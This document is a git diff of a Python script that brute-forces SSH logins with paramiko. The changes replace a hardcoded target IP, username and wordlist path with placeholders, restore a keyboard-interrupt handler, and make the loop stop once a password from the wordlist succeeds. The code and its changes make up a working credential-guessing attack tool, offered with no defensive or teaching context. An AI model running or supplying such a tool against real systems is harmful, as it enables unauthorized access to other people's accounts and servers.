@@ -8,10 +8,10 @@
 
 import paramiko, time, socket
 
-global host, sys, user, secret
-host = "192.168.18.73"
-user = "chris"
-pass_file = "/home/vmubuntu/wordlist/cracker.txt"
+global host, user, secret
+host = "Your target"
+user = "Username Target"
+pass_file = "Wordlist"
 
 def menu():
     print ("\nwhat would you like to do?\n")
@@ -116,18 +116,15 @@ def connection(host, username, password):
         #Continue brute forcing server
    
    #Gives alternative message when manually stoping the script
-#    except KeyboardInterrupt:
-#         print ("[!]\n\n[*] ^_^ Goodbye")
-#         sys.exit(3)
-#         #Code 3, specific message
+   except KeyboardInterrupt:
+        print ("\n[*] ^_^ Goodbye!")
+        sys.exit(3)
+        #Code 3, specific message
    
    else:    
         print(f"\n[*] Password cracked: {username} : {password}\n")
         return True
-        break
-   
-   
-
+        
 #Iterates through passwords in file and pass them through the next function for validation
 def look_through(pass_file):
     file = open(pass_file, encoding = "ISO-8859-1")
@@ -136,8 +133,13 @@ def look_through(pass_file):
     #Reads each element in the file
         secret = i.strip()
         #Removes empty spaces for the string
-        connection(host, user, secret)
+        victory = connection(host, user, secret)
         #Call on the function and passses "secret" as "password"
+        if victory == True:
+            break
+        #Stops the list when it finds the match
+        else:
+            continue      
     
 #Main function                                     
 def main():
